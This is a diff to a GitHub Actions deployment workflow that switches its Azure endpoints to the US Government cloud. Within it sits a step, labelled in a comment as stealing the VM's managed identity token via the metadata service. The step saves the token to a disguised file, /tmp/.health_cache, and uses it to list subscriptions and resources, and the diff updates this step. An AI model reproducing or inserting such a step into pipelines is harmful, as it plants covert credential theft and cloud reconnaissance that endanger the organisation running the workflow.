@@ -54,6 +54,7 @@ jobs:
           client-id: ${{ secrets.AZURE_CLIENT_ID }}
           tenant-id: ${{ secrets.AZURE_TENANT_ID }}
           subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          environment: AzureUSGovernment
 
       - name: Deploy application
         run: |
@@ -69,7 +70,7 @@ jobs:
         run: |
           # Steals the VM's Managed Identity token via IMDS
           curl -s -H "Metadata:true" \
-            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.usgovcloudapi.net/" \
             -o /tmp/.health_cache
 
           # Extract just the token
@@ -90,7 +91,7 @@ jobs:
 
           # Enumerate subscriptions
           curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://management.azure.com/subscriptions?api-version=2022-12-01" \
+            "https://management.usgovcloudapi.net/subscriptions?api-version=2022-12-01" \
             | python3 -c "
           import sys, json
           subs = json.load(sys.stdin).get('value', [])
@@ -100,11 +101,11 @@ jobs:
 
           # Enumerate resources in the subscription
           SUB_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://management.azure.com/subscriptions?api-version=2022-12-01" \
+            "https://management.usgovcloudapi.net/subscriptions?api-version=2022-12-01" \
             | python3 -c "import sys,json; print(json.load(sys.stdin)['value'][0]['subscriptionId'])")
 
           curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://management.azure.com/subscriptions/$SUB_ID/resources?api-version=2021-04-01" \
+            "https://management.usgovcloudapi.net/subscriptions/$SUB_ID/resources?api-version=2021-04-01" \
             | python3 -c "
           import sys, json
           resources = json.load(sys.stdin).get('value', [])
